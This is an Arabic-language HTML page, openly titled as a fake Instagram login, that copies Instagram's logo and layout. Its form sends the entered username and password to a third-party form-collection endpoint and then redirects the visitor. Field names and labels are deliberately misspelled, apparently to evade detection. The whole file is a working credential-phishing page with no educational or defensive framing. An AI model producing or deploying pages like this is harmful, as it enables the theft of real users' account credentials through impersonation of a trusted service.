<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول - إنستقرام وهمي</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }
    .login-container {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 30px;
      width: 350px;
      text-align: center;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .login-container img {
      margin-bottom: 20px;
      width: 180px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px 8px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      font-size: 14px;
      box-sizing: border-box;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #a8a8a8;
      background: white;
    }
    button {
      margin-top: 12px;
      width: 100%;
      padding: 10px 0;
      background-color: #3897f0;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #2f81d7;
    }
    .divider {
      margin: 20px 0;
      font-size: 13px;
      color: #999;
      border-bottom: 1px solid #dbdbdb;
      line-height: 0.1em;
      text-align: center;
    }
    .divider span {
      background: #fafafa;
      padding: 0 10px;
    }
    .footer-text {
      margin-top: 15px;
      font-size: 13px;
      color: #999;
    }
    a {
      color: #3897f0;
      text-decoration: none;
      font-weight: 600;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" />
    
    <form action="https://formspree.io/f/mdkzekkk" method="POST">
      <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required />
      <input type="password" name="passw0rd" placeholder="Pasworb" required />

      <!-- إعادة توجيه بعد الإرسال -->
      <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html" />

      <button type="submit">تسجيل الدخول</button>
    </form>

    <div class="divider"><span>أو</span></div>
    <a href="#">هل نسيت الـ Pasw0rd؟</a>
    <div class="footer-text">
      ليس لديك حساب؟ <a href="#">سجّل الآن</a>
    </div>
  </div>
</body>
</html>
